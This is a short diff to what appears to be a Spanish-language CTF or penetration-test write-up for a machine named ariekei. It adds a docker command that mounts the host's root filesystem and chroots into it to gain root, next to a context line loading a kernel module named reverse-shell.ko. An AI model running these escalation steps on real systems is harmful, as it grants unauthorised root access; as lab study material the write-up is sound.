@@ -49,3 +49,10 @@ clean:
 root@a2d8c468a7c2:/tmp# insmod reverse-shell.ko
 ```
 
+## Creación de contenedor con montura desde la raíz
+
+```null
+spanishdancer@ariekei:/opt/docker$ docker images
+spanishdancer@ariekei:/opt/docker$ docker run -it -v /:/host/ waf-template chroot /host/ bash
+```
+
